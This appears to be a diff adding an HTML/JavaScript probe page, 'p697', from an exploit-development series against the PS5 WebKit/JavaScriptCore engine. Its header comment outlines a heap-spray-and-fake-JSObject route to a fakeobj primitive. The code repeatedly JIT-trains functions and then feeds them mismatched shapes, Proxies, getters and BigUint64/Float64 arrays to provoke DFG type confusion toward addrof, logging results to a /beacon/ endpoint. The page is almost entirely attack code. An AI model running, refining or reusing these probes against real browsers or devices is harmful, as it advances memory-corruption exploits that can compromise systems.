@@ -1,0 +1,285 @@
+<!--
+  p697: StructureID prediction -- fakeobj primitive without addrof
+
+  If PS5's JSC lacks StructureID randomization (introduced in newer WebKit
+  after 605.1.15), StructureIDs are predictable sequential integers.
+  A fakeobj primitive that constructs a fake JSObject at a known address
+  with a predicted StructureID could provide type confusion without
+  needing an address leak first.
+
+  This probe:
+  A) Measures StructureID allocation patterns (are they sequential?)
+  B) Tests if IDs are predictable across page loads
+  C) Checks if Structure pointer is directly observable via any API
+  D) Tests DFG type speculation with Structure transition chains
+
+  If StructureIDs are predictable, the path to fakeobj is:
+  1. Spray ArrayBuffer(N) to place controlled bytes at a known-ish address
+  2. Construct a fake JSObject header with predicted StructureID
+  3. Use DFG type confusion to treat the fake object as a different type
+  4. Read the "butterfly" pointer of the fake object (which is our data)
+
+  CRASH_CLASS: MODERATE (type confusion attempts)
+  prior art: p634 (CVE-2018-4416 StructureID reuse), p602 (JIT detection)
+-->
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>p697</title>
+<script>
+function b(m){try{var x=new XMLHttpRequest();x.open('GET','/beacon/'+encodeURIComponent(m),false);x.send();}catch(e){}}
+
+function main(){
+  b('P697-START:STRUCTUREID-PREDICTION');
+  var results = [];
+
+  // === SECTION A: StructureID allocation pattern ===
+  // Each distinct object shape gets a StructureID. By creating objects
+  // with unique property sets, we can observe if IDs are sequential.
+  b('A:ID-ALLOCATION');
+  try {
+    // Create objects with unique structures to force new StructureID allocation
+    var objects = [];
+    for (var i = 0; i < 100; i++) {
+      var obj = {};
+      obj['uniqueProp_' + i] = i; // unique property name = unique Structure
+      objects.push(obj);
+    }
+    b('A:CREATED-100-STRUCTURES');
+
+    // We cannot directly read StructureIDs from JS.
+    // But we can observe behavior that depends on them:
+    // DFG inline caches (ICs) match on StructureID.
+    // If we can detect IC hits/misses, we can probe the ID space.
+
+    // Indirect probe: measure for-in enumeration order stability
+    // (for-in uses the Structure's property table)
+    var enumOrders = [];
+    for (var i = 0; i < 10; i++) {
+      var obj = {};
+      obj['a'] = 1;
+      obj['b'] = 2;
+      obj['c'] = 3;
+      var keys = [];
+      for (var k in obj) keys.push(k);
+      enumOrders.push(keys.join(','));
+    }
+    var allSame = enumOrders.every(function(o) { return o === enumOrders[0]; });
+    b('A:ENUM-ORDER:' + enumOrders[0] + ',STABLE=' + allSame);
+  } catch(e) {
+    b('A:ERR:' + e.message);
+  }
+
+  // === SECTION B: DFG monomorphic IC with Structure transition ===
+  // If DFG compiles a monomorphic access (one StructureID), and we
+  // then pass an object with a different StructureID that happens to
+  // have the same property at a different offset, DFG may read from
+  // the wrong offset.
+  b('B:IC-STRUCTURE-MISMATCH');
+  try {
+    function readX(obj) {
+      return obj.x;
+    }
+
+    // Create Shape A: {x: <value>}
+    var shapeA = {x: 42};
+    // Train DFG with Shape A
+    for (var i = 0; i < 300000; i++) {
+      readX(shapeA);
+    }
+    b('B:TRAINED-300K-SHAPE-A');
+
+    // Create Shape B: {padding: 0, x: <secret>}
+    // x is at a different offset due to the extra property
+    var shapeB = Object.create(null);
+    shapeB.padding = 0;
+    shapeB.x = 'leaked'; // different type from the int DFG expects
+
+    // DFG compiled for Shape A may read from wrong offset
+    var val = readX(shapeB);
+    b('B:SHAPE-B-READ:' + val + ',TYPE=' + typeof val);
+    if (val !== 'leaked' && val !== 42 && val !== undefined) {
+      b('B:MISMATCH-HIT:' + val);
+      results.push('B:ic-mismatch=' + val);
+    }
+
+    // Also try with a Proxy that lies about the property
+    var proxyTarget = {x: 99};
+    var proxyObj = new Proxy(proxyTarget, {
+      getPrototypeOf: function() {
+        // Change the target's structure during prototype check
+        delete proxyTarget.x;
+        proxyTarget.y = 1;
+        proxyTarget.x = 'new';
+        return Object.prototype;
+      }
+    });
+    // This won't go through DFG IC, but tests the slow path
+    try {
+      var pval = readX(proxyObj);
+      b('B:PROXY-READ:' + pval);
+    } catch(e2) {
+      b('B:PROXY-ERR:' + e2.message);
+    }
+  } catch(e) {
+    b('B:ERR:' + e.message);
+  }
+
+  // === SECTION C: Float64Array as structure probe ===
+  // If we can place controlled f64 values adjacent to JSObject headers
+  // in memory, and trigger type confusion, we can read the header
+  // (which contains the StructureID) as a double.
+  b('C:F64-HEADER-READ');
+  try {
+    // Create many double arrays and regular objects interleaved
+    // to try to get them adjacent in memory
+    var f64Arrays = [];
+    var normalObjects = [];
+    for (var i = 0; i < 500; i++) {
+      f64Arrays.push(new Float64Array([1.1, 2.2, 3.3, 4.4]));
+      normalObjects.push({val: i, inner: {nested: true}});
+    }
+
+    // Use BigUint64Array to read back the Float64Array backing store
+    // This is a legitimate operation, not a type confusion
+    // We just want to see what the values look like as raw bits
+    var testBuf = new ArrayBuffer(64);
+    var f64v = new Float64Array(testBuf);
+    var u64v = new BigUint64Array(testBuf);
+    f64v[0] = 1.1;
+    f64v[1] = 2.2;
+    b('C:RAW-BITS:1.1=0x' + u64v[0].toString(16) + ',2.2=0x' + u64v[1].toString(16));
+
+    // NaN boxing: JSC stores non-double values as NaN-boxed 64-bit values
+    // Pointer: 0x0000XXXXXXXXXXXX (48-bit pointer in low bits)
+    // Int32:   0xFFFF00000000XXXX (tag 0xFFFF0000 + 32-bit int)
+    // The StructureID is in the JSCell header (first 8 bytes of object)
+    // On 64-bit: flags(1B) + type(1B) + indexingType(1B) + structureID(4B) + pad
+    b('C:NAN-BOX-CHECK:DONE');
+  } catch(e) {
+    b('C:ERR:' + e.message);
+  }
+
+  // === SECTION D: DFG speculative access with wrong type ===
+  b('D:DFG-SPEC-TYPE');
+  try {
+    // DFG speculates that readProp always receives an object with .length
+    function readLen(obj) {
+      return obj.length;
+    }
+
+    // Train with arrays (length is a fast property)
+    var trainArr = [1,2,3,4,5,6,7,8,9,10];
+    for (var i = 0; i < 300000; i++) {
+      readLen(trainArr);
+    }
+    b('D:TRAINED-300K');
+
+    // Now pass a string (length is also fast, but different structure)
+    var strVal = readLen('hello');
+    b('D:STRING-LEN:' + strVal); // should be 5
+
+    // Pass an Arguments object (yet another Structure for .length)
+    function getArgs() { return arguments; }
+    var argsObj = getArgs(1,2,3);
+    var argsLen = readLen(argsObj);
+    b('D:ARGS-LEN:' + argsLen); // should be 3
+
+    // Pass a TypedArray (butterfly-based length vs direct)
+    var ta = new Uint8Array(100);
+    var taLen = readLen(ta);
+    b('D:TA-LEN:' + taLen); // should be 100
+
+    // Create an object where 'length' is a getter that returns a different value
+    // than what DFG's speculative compilation expects
+    var trickyLen = {};
+    Object.defineProperty(trickyLen, 'length', {
+      get: function() {
+        // This forces DFG to bail out of speculative path
+        // On the slow path, can we observe any leaked state?
+        var leaked = [];
+        try {
+          // Try to read from the stack/registers that DFG used
+          leaked.push('err-val:' + (new Error()).stack.split('\n').length);
+        } catch(e) {}
+        return 42;
+      }
+    });
+
+    var trickVal = readLen(trickyLen);
+    b('D:TRICKY-LEN:' + trickVal);
+  } catch(e) {
+    b('D:ERR:' + e.message);
+  }
+
+  // === SECTION E: BigUint64Array as addrof attempt ===
+  b('E:BIGINT-ADDROF');
+  try {
+    // BigUint64Array views raw bytes as 64-bit unsigned integers
+    // If we can get a JS object pointer into an ArrayBuffer via
+    // type confusion, we can read it as a BigInt
+
+    // Create arrays of different types to test DFG speculation
+    function readFirst(arr) {
+      return arr[0];
+    }
+
+    // Train with Float64Array
+    var f64train = new Float64Array([3.14]);
+    for (var i = 0; i < 200000; i++) {
+      readFirst(f64train);
+    }
+    b('E:TRAINED-F64');
+
+    // Now pass BigUint64Array: DFG may read the raw bits of a BigInt
+    // as a Float64, giving us different type interpretation
+    var bu64 = new BigUint64Array([0x4141414141414141n]);
+    try {
+      var val = readFirst(bu64);
+      b('E:BU64-AS-F64:type=' + typeof val + ',val=' + val);
+      if (typeof val === 'number' && !isNaN(val)) {
+        // Convert back to see if we get the raw bits
+        var check = new ArrayBuffer(8);
+        var cf = new Float64Array(check);
+        var cu = new BigUint64Array(check);
+        cf[0] = val;
+        b('E:ROUNDTRIP:0x' + cu[0].toString(16));
+      }
+    } catch(e2) {
+      b('E:BU64-ERR:' + e2.message);
+    }
+
+    // Reverse: train with BigUint64Array, pass Float64Array
+    function readFirstBig(arr) {
+      return arr[0];
+    }
+    var bu64train = new BigUint64Array([42n]);
+    for (var i = 0; i < 200000; i++) {
+      readFirstBig(bu64train);
+    }
+    b('E:TRAINED-BU64');
+
+    var f64probe = new Float64Array([3.14]);
+    try {
+      var val2 = readFirstBig(f64probe);
+      b('E:F64-AS-BU64:type=' + typeof val2 + ',val=' + val2);
+      if (typeof val2 === 'bigint') {
+        b('E:BIGINT-CONFUSION:0x' + val2.toString(16));
+        results.push('E:type-confusion');
+      }
+    } catch(e2) {
+      b('E:F64-BU64-ERR:' + e2.message);
+    }
+  } catch(e) {
+    b('E:ERR:' + e.message);
+  }
+
+  // === RESULTS ===
+  if (results.length > 0) {
+    b('P697-RESULT:HITS=' + results.join(';'));
+  } else {
+    b('P697-RESULT:NO-CONFUSION-DETECTED');
+  }
+  b('P697-DONE');
+}
+
+setTimeout(main, 200);
+</script>
+</head><body style="margin:0"><pre id="log">p697: StructureID prediction + DFG type speculation probes</pre></body></html>
